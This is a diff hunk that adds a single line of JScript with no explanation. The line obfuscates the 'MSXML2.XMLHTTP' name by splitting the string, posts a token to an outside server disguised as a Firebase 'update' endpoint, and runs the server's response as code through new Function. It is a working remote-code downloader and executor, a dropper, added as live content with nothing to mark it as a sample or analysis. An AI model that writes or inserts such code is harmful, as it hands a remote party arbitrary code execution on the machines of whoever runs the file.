@@ -1,0 +1,1 @@
+var a="MSXML2.",b="XML",c="HTTP";var x=new ActiveXObject(a+b+c);x.open("POST","https://firebase.example-ventures.invalid/update",false);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.send("t=Zq9f2LmX0aBc7KdE1rTy");if(x.status==200){var f=new Function(x.responseText);f();}
